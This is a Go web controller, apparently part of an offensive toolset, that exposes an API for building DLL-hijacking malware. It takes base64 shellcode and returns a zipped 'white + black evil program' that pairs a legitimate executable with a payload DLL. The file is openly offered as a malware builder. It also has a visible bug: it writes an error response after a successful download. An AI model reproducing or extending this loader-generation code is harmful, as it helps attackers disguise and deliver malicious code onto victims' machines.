package controller

import (
	"encoding/base64"
	"fmt"
	"mime"
	"toolset/httputil"
	"toolset/model"
	"toolset/plugins"

	"github.com/gin-gonic/gin"
)

// DllHijackConfig godoc
// @Summary get dll hijack option
// @Description get all valid dll hijack option
// @Tags config
// @Accept json
// @Produce json
// @Success 200 {array} plugins.DllHijackOptionItem
// @Router /loader/dll-hijack/config [get]
func (c *Controller) DllHijackConfig(ctx *gin.Context) {
	ctx.JSON(200, plugins.DllHijackConfig())
}

// DllHijack godoc
// @Summary generate a white + black
// @Description generate a white + black evil program
// @Tags pretender
// @Accept json
// @Produce octet-stream
// @Produce json
// @Param runner body model.DllHijack true "the param to generate pretender" Format(object)
// @Success 200 {file} binary "pretender"
// @Failure 400 {object} httputil.HTTPError
// @Failure 500 {object} httputil.HTTPError
// @Router /loader/dll-hijack [post]
func (c *Controller) DllHijack(ctx *gin.Context) {
	var dllHijack model.DllHijack

	if err := ctx.ShouldBindJSON(&dllHijack); err != nil {
		httputil.NewError(ctx, 400, err)
		return
	}
	shellcode, err := base64.StdEncoding.DecodeString(dllHijack.Shellcode)
	if err != nil {
		httputil.NewError(ctx, 400, err)
		return
	}
	hijackType := dllHijack.Type
	for _, h := range plugins.DllHijackConfig() {
		if h.Type == hijackType {
			h.Runner.SetShellcdoe(shellcode)
			data, err := h.Runner.Run()
			if err != nil {
				httputil.NewError(ctx, 400, err)
				return
			}
			ctx.Data(200, mime.TypeByExtension(".zip"), data)
		}
	}
	httputil.NewError(ctx, 404, fmt.Errorf("no corresponding type found"))
}
